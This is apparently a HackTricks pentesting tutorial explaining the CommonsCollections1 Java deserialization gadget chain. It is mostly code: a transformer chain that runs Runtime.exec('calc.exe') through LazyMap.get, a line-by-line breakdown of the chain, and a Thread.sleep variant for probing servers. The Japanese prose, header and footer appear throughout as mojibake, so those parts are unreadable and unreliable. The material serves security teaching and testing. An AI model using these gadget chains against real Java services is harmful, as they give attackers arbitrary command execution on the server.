# CommonsCollection1 ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ - Java Transformers to Rutime exec() ãŠã‚ˆã³ Thread Sleep

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼**ã—ã¦ã¿ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ **æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã® PEASS ã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* [**å…¬å¼ PEASS & HackTricks ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* **[ğŸ’¬](https://emojipedia.org/speech-balloon/) Discord ã‚°ãƒ«ãƒ¼ãƒ—**ã«**å‚åŠ **ã™ã‚‹ã‹ã€[**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricks ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks) ãŠã‚ˆã³ [hacktricks-cloud ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)** ã« PR ã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## Java Transformers to Rutime exec()

ã„ãã¤ã‹ã®å ´æ‰€ã§ã€æ¬¡ã®ã‚ˆã†ãª Apache common collections ã®ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒã‚’ä½¿ç”¨ã—ãŸ Java é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
ã‚‚ã—Javaã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ã¤ã„ã¦ä½•ã‚‚çŸ¥ã‚‰ãªã„å ´åˆã€ãªãœã“ã®ã‚³ãƒ¼ãƒ‰ãŒcalcã‚’å®Ÿè¡Œã™ã‚‹ã®ã‹ã‚’ç†è§£ã™ã‚‹ã®ã¯é›£ã—ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã¾ãšæœ€åˆã«çŸ¥ã£ã¦ãŠãã¹ãã“ã¨ã¯ã€**Javaã«ãŠã‘ã‚‹Transformer**ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚’å—ã‘å–ã‚Š**ã€**ç•°ãªã‚‹ã‚¯ãƒ©ã‚¹ã«å¤‰æ›ã™ã‚‹**ã‚‚ã®ã§ã™ã€‚\
ã¾ãŸã€ã“ã“ã§**å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ãŒ**ç­‰ä¾¡**ã§ã‚ã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ãŠãã¨èˆˆå‘³æ·±ã„ã§ã™ï¼š
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
ã¾ãŸã¯ã€**ã‚ˆã‚Šæ­£ç¢ºã«ã¯**ã€æœ€çµ‚çš„ã«å®Ÿè¡Œã•ã‚Œã‚‹å†…å®¹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### æ–¹æ³•

ã§ã¯ã€æœ€åˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒã©ã®ã‚ˆã†ã«ã—ã¦ã€Œã‚·ãƒ³ãƒ—ãƒ«ãªã€ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã¨åŒç­‰ã§ã‚ã‚‹ã‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã¾ãšã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä¸­ã§**å¤‰æ›ã®ãƒã‚§ãƒ¼ãƒ³ï¼ˆé…åˆ—ï¼‰ãŒä½œæˆ**ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ°—ã¥ãã“ã¨ãŒã§ãã¾ã™ã€‚
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ã€é…åˆ—ã®å¤‰æ›ã‚’ä½•ã‚‰ã‹ã®æ–¹æ³•ã§é€£é–ã•ã›ã‚‹ã¨ã€ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€**ã“ã‚Œã‚‰ã®å¤‰æ›ã¯ã©ã®ã‚ˆã†ã«é€£é–ã•ã‚Œã‚‹ã®ã§ã™ã‹ï¼Ÿ**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
æœ€å¾Œã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**Mapã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒä½œæˆ**ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚æ¬¡ã«ã€`LazyMap`ã‹ã‚‰`decorate`é–¢æ•°ãŒå®Ÿè¡Œã•ã‚Œã€ãƒãƒƒãƒ—ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ãŒæ¸¡ã•ã‚Œã¾ã™ã€‚æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‹ã‚‰ã€ã“ã‚Œã«ã‚ˆã‚Š**ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼**ãŒ`lazyMap.factory`å±æ€§ã®å†…éƒ¨ã«ã‚³ãƒ”ãƒ¼ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ï¼š
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
ãã—ã¦ã€ç´ æ™´ã‚‰ã—ã„ãƒ•ã‚£ãƒŠãƒ¼ãƒ¬ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ï¼š`lazyMap.get("anything");`

ã“ã‚ŒãŒ`get`é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
ãã—ã¦ã€ã“ã‚ŒãŒ`transform`é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
ã—ãŸãŒã£ã¦ã€**`factory`** ã®å†…éƒ¨ã«ã¯ **`chainedTransformer`** ãŒä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€**`transform`** é–¢æ•°ã®å†…éƒ¨ã§ã¯ã€**ãã‚Œã‚‰ã®ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸtransformerã‚’ã™ã¹ã¦é€šé**ã—ã€1ã¤ãšã¤å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚é¢ç™½ã„ã“ã¨ã«ã€**å„transformerã¯å…¥åŠ›ã¨ã—ã¦`object`ã‚’ä½¿ç”¨**ã—ã€**objectã¯å‰ã«å®Ÿè¡Œã•ã‚ŒãŸtransformerã®å‡ºåŠ›**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã™ã¹ã¦ã®transformã¯ã€æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«ãƒã‚§ãƒ¼ãƒ³ã•ã‚Œã¦ã„ã¾ã™**ã€‚

### è¦ç´„

æœ€çµ‚çš„ã«ã¯ã€lazyMapãŒgetãƒ¡ã‚½ãƒƒãƒ‰å†…ã§ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸtransformerã‚’ã©ã®ã‚ˆã†ã«ç®¡ç†ã—ã¦ã„ã‚‹ã‹ã«ã‚ˆã£ã¦ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ã‹ã®ã‚ˆã†ã§ã™ã€‚
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚`value` ãŒå„å¤‰æ›ã®å…¥åŠ›ã§ã‚ã‚Šã€å‰ã®å¤‰æ›ã®å‡ºåŠ›ã§ã‚ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã®å®Ÿè¡ŒãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
Note that here it **was explained the gadgets** used for the **ComonsCollections1** payload. But it's left **how all this starts it's executing**. You can see [here that **ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java), in order to execute this payload, uses an `AnnotationInvocationHandler` object because **when this object gets deserialized**, it will **invoke** the `payload.get()` function that will **execute the whole payload**.

## Java Thread Sleep

This payload could be **handy to identify if the web is vulnerable as it will execute a sleep if it is**.
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## ã‚ˆã‚Šå¤šãã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆ

ã“ã¡ã‚‰ã§ã•ã‚‰ã«å¤šãã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ã¦ã¿ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* **[ğŸ’¬](https://emojipedia.org/speech-balloon/) [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
